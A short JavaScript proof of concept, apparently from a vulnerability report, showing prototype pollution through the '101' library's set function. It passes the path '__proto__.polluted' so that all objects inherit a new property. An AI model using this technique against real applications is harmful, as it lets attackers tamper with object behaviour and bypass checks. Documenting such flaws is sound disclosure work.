var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const _101 = require('101/set');
_101(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);